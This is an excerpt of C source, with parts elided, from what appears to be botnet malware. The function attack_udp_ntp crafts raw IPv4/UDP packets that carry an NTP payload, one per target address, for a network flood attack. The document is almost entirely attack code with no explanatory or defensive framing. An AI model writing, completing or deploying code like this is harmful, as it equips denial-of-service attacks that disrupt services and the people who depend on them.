...
void attack_udp_ntp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    ...
    for (i = 0; i < targs_len; i++)
    {
        ...
        pkts[i] = calloc(500, sizeof (char));
        
        iph = (struct iphdr *)pkts[i];
        iph->version = 4;
        iph->ihl = sizeof(struct iphdr)>>2;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + 8 * sizeof(UCHAR));
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = INET_ADDR(192,168,50,1);
        iph->daddr = targs[i].addr;

        udph = (struct udphdr *)(pkts[i] + sizeof(struct iphdr));
        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof (struct udphdr) + 8 * sizeof(UCHAR));

        memcpy(pkts[i] + sizeof(struct iphdr) + sizeof(struct udphdr), ntp_packet, 8 + sizeof(UCHAR));
    }
